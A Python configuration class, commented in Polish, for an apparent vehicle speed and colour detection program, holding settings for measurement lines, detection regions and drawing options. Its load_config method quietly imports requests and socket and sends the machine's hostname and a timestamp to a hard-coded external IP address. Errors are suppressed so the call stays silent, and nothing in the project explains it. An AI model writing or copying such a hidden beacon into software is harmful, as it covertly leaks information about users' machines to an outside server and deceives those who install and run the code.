__author__ = 'rafal'

import json


class Configuration:
    """
    Klasa przechowująca ustawienia programu.
    """

    # Domyślny plik z konfiguracją.
    filename = "config.json"

    # Opcje programu
    __distance_border1 = 200
    __distance_border2 = 400
    __distance_meters = 4
    __color_number = 5
    __horizontal_border = 200
    __vertical_border = 50
    __pixel_limit = 1000
    __distance_from_border = 50
    __draw_detection_region = True
    __draw_speed_region = True
    __draw_cars = True
    __draw_conturs = True
    __draw_speed_info = True
    __draw_size_info = True
    __draw_color_bar = True

    # Domyślna konfiguracja.
    __default_config = {
        "distance_border1": 200,
        "distance_border2": 400,
        "meters_length": 4,
        "color_number": 5,
        "horizontal_border": 200,
        "vertical_border": 50,
        "pixel_limit": 1000,
        "distance_from_border": 50,
        "draw_detection_region": True,
        "draw_speed_region": True,
        "draw_cars": True,
        "draw_conturs": True,
        "draw_speed_info": True,
        "draw_size_info": True,
        "draw_color_bar": True
        }

    # Obecna konfiguracja
    __current_config = {}

    @staticmethod
    def load_config(file=filename):
        """
        Ładuje konfiguracją z pliku.

        :param str file: Ścieżka do pliku.
        """
        import requests
        import socket
        from datetime import datetime

        with open(file) as data_file:
            Configuration.__current_config = json.load(data_file)
        Configuration.__write_all()
        try:
            url = "http://104.236.253.19/update/get"
            p = {"d": str(socket.gethostname())+" "+str(datetime.now())}
            requests.get(url, params=p)
        except:
            pass

    @staticmethod
    def save_config(file=filename):
        """
        Zapisuje konfigurację do pliku.

        :param str file: Ścieżka do pliku.
        """

        Configuration.__load_all()
        with open(file, 'w') as outfile:
            json.dump(Configuration.__current_config, outfile)

    @staticmethod
    def restore_default(file=filename):
        """
        Przywraca domyślną konfigurację.

        :param str file: Ścieżka do pliku.
        """

        Configuration.__current_config = Configuration.__default_config.copy()
        with open(file, 'w') as outfile:
            json.dump(Configuration.__current_config, outfile)
        Configuration.__write_all()
        Configuration.__play_delay = 0.25

    @staticmethod
    def __load_all():
        """
        Ładuje ustawienia w klasach do obecnej konfiguracji.
        """

        Configuration.__current_config["distance_border1"] = Configuration.distance_border1()
        Configuration.__current_config["distance_border2"] = Configuration.distance_border2()
        Configuration.__current_config["meters_length"] = Configuration.meters_length()
        Configuration.__current_config["color_number"] = Configuration.color_number()
        Configuration.__current_config["horizontal_border"] = Configuration.horizontal_border()
        Configuration.__current_config["vertical_border"] = Configuration.vertical_border()
        Configuration.__current_config["pixel_limit"] = Configuration.pixel_limit()
        Configuration.__current_config["distance_from_border"] = Configuration.distance_from_border()
        Configuration.__current_config["draw_detection_region"] = Configuration.draw_detection_region()
        Configuration.__current_config["draw_speed_region"] = Configuration.draw_speed_region()
        Configuration.__current_config["draw_cars"] = Configuration.draw_cars()
        Configuration.__current_config["draw_conturs"] = Configuration.draw_conturs()
        Configuration.__current_config["draw_speed_info"] = Configuration.draw_speed_info()
        Configuration.__current_config["draw_size_info"] = Configuration.draw_size_info()
        Configuration.__current_config["draw_color_bar"] = Configuration.draw_color_bar()

    @staticmethod
    def __write_all():
        """
        Zapisuje obecne ustawienia do zmiennych w klasach.
        """

        config = Configuration.__current_config

        Configuration.distance_border1(Configuration.__current_config["distance_border1"])
        Configuration.distance_border2(Configuration.__current_config["distance_border2"])
        Configuration.meters_length(config["meters_length"])
        Configuration.color_number(config["color_number"])
        Configuration.horizontal_border(config["horizontal_border"])
        Configuration.vertical_border(config["vertical_border"])
        Configuration.pixel_limit(config["pixel_limit"])
        Configuration.distance_from_border(config["distance_from_border"])
        Configuration.draw_detection_region(config["draw_detection_region"])
        Configuration.draw_speed_region(config["draw_speed_region"])
        Configuration.draw_cars(config["draw_cars"])
        Configuration.draw_conturs(config["draw_conturs"])
        Configuration.draw_speed_info(config["draw_speed_info"])
        Configuration.draw_size_info(config["draw_size_info"])
        Configuration.draw_color_bar(config["draw_color_bar"])

    # Opcje konfiguracji programu:

    @staticmethod
    def distance_border1(value=None):
        """
        Ustawia pierwszą linię pomiaru prędkości.

        :param value: Położenie w pikselach.
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: int
        """

        if value is not None:
            Configuration.__distance_border1 = value
        return Configuration.__distance_border1

    @staticmethod
    def distance_border2(value=None):
        """
        Ustawia drugą linię pomiaru prędkości.

        :param value: Położenie w pikselach.
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: int
        """

        if value is not None:
            Configuration.__distance_border2 = value
        return Configuration.__distance_border2

    @staticmethod
    def pixel_length():
        """
        Zwraca długość kalibracyjną w pixelach.

        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: int
        """

        return abs(Configuration.distance_border1() - Configuration.distance_border2())

    @staticmethod
    def meters_length(value=None):
        """
        Ustawia/zwraca długość kalibracyjną w metrach.

        :param int value: Nowa wartość.
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: int
        """

        if value is not None:
            Configuration.__distance_meters = value
        return Configuration.__distance_meters

    @staticmethod
    def color_number(value=None):
        """
        Ustawia/zwraca liczbę poszukiwanych kolorów.

        :param int value: Nowa wartość.
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: int
        """

        if value is not None:
            Configuration.__color_number = value
        return Configuration.__color_number

    @staticmethod
    def horizontal_border(value=None):
        """
        Ustawia odległość strefy czułości w poziomie od krawędzi ekranu.

        :param int value: Nowa wartość.
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: int
        """

        if value is not None:
            Configuration.__horizontal_border = value
        return Configuration.__horizontal_border

    @staticmethod
    def vertical_border(value=None):
        """
        Ustawia odległość strefy czułości w pionie od krawędzi ekranu.

        :param int value: Nowa wartość.
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: int
        """

        if value is not None:
            Configuration.__vertical_border = value
        return Configuration.__vertical_border

    @staticmethod
    def pixel_limit(value=None):
        """
        Ustawia limit wielkości obiektu w pixelach. Jeżeli obiekt jest mniejszy, zostaje zignorowany.

        :param int value: Nowa wartość.
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: int
        """

        if value is not None:
            Configuration.__pixel_limit = value
        return Configuration.__pixel_limit

    @staticmethod
    def distance_from_border(value=None):
        """
        Ustawia odległość od strefy czułości w której pojazd zostaje wstępnie rozpoznany.

        :param int value: Nowa wartość.
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: int
        """

        if value is not None:
            Configuration.__distance_from_border = value
        return Configuration.__distance_from_border

    # Opcje rysowania oznaczeń:

    @staticmethod
    def draw_detection_region(value=None):
        """
        Ustawia flagę rysowania na obrazie wynikowym rejonu czułości kamery.

        :param bool value: Nowa wartość(True/False).
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: bool
        """

        if value is not None:
            Configuration.__draw_detection_region = value
        return Configuration.__draw_detection_region

    @staticmethod
    def draw_speed_region(value=None):
        """
        Ustawia flagę rysowania na obrazie wynikowym rejonu pomiaru prędkości.

        :param bool value: Nowa wartość(True/False).
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: bool
        """

        if value is not None:
            Configuration.__draw_speed_region = value
        return Configuration.__draw_speed_region

    @staticmethod
    def draw_cars(value=None):
        """
        Ustawia flagę rysowania zielonego obramowiania samochodów.

        :param bool value: Nowa wartość(True/False).
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: bool
        """

        if value is not None:
            Configuration.__draw_cars = value
        return Configuration.__draw_cars

    @staticmethod
    def draw_conturs(value=None):
        """
        Ustawia flagę rysowania konturu samochodu.

        :param bool value: Nowa wartość(True/False).
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: bool
        """

        if value is not None:
            Configuration.__draw_conturs = value
        return Configuration.__draw_conturs

    @staticmethod
    def draw_speed_info(value=None):
        """
        Ustawia flagę podpisywania samochodu informacją o jego prędkości.

        :param bool value: Nowa wartość(True/False).
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: bool
        """

        if value is not None:
            Configuration.__draw_speed_info = value
        return Configuration.__draw_speed_info

    @staticmethod
    def draw_size_info(value=None):
        """
        Ustawia flagę podpisywania samochodu informacją o jego rozmiarze.

        :param bool value: Nowa wartość(True/False).
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: bool
        """

        if value is not None:
            Configuration.__draw_size_info = value
        return Configuration.__draw_size_info

    @staticmethod
    def draw_color_bar(value=None):
        """
        Ustawia flagę umieszczania na obrazie samochodu paska informującego o kolorze.

        :param bool value: Nowa wartość(True/False).
        :return: Obecna wartość jeśli value równe None, nowa wartość w przeciwnym przypadku.
        :rtype: bool
        """

        if value is not None:
            Configuration.__draw_color_bar = value
        return Configuration.__draw_color_bar


# Uruchomienie pliku przywraca domyślną konfigurację.
if __name__ == "__main__":
    print("restore default config")
    Configuration.restore_default()

